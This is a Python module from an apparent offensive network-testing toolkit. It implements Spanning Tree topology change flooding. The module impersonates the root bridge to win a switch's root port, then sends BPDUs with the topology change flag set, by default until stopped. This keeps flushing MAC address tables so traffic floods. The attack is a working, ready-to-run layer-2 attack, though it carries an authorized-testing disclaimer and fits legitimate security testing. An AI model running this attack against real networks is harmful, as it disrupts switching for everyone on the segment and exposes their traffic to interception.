"""Topology change flooding: repeat the topology change flag to flush learned addresses.

Spanning Tree signals a topology change with the topology change (TC) flag in
configuration BPDUs. A switch that receives it on its root port shortens the ageing
time of its MAC address table and flushes entries, so frames flood until the
addresses are learned again. A device that keeps the flag set keeps the table
flushing, which degrades forwarding and exposes traffic to flooding.

The TC flag is honored only on the root port, so the attacker must first win the
root port. This module therefore sends the same root-ID stream as root bridge
impersonation, with the TC flag set in every BPDU. Use it with a control run
(impersonation without the flag) to attribute any flush to the flag.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass
from typing import Any

from macabre.attacks.common import Runner
from macabre.attacks.root_bridge_impersonation import (
    RootBridgeImpersonationConfig,
    RootBridgeImpersonationStats,
    run_root_bridge_impersonation,
)

TopologyChangeFloodingStats = RootBridgeImpersonationStats


@dataclass(frozen=True)
class TopologyChangeFloodingConfig:
    iface: str                          # attacker interface, on the switch port under test
    root_priority: int                  # priority of the real root, copied from its BPDUs
    root_mac: str                       # MAC of the real root, copied from its BPDUs (required)
    root_path_cost: int = 0             # cost advertised to the root (lower wins the root port)
    bridge_priority: int = 0            # priority of this bridge's own ID
    count: int = 0                      # BPDUs to send; 0 = keep sending until stopped
    interval: float = 0.5               # seconds between BPDUs; a short interval keeps the flush going
    dry_run: bool = False

    def __post_init__(self) -> None:
        # Reuse the impersonation checks, so both attacks reject the same inputs.
        self.to_impersonation_config()

    def to_impersonation_config(self) -> RootBridgeImpersonationConfig:
        return RootBridgeImpersonationConfig(
            iface=self.iface,
            root_priority=self.root_priority,
            root_mac=self.root_mac,
            root_path_cost=self.root_path_cost,
            bridge_priority=self.bridge_priority,
            count=self.count,
            interval=self.interval,
            dry_run=self.dry_run,
            topology_change=True,
        )


def run_topology_change_flooding(
    config: TopologyChangeFloodingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[TopologyChangeFloodingStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
) -> TopologyChangeFloodingStats:
    """Send root-ID BPDUs with the topology change flag set, until `count` or `stop_event`."""
    return run_root_bridge_impersonation(
        config.to_impersonation_config(), stop_event, on_progress, run=run, send=send,
    )
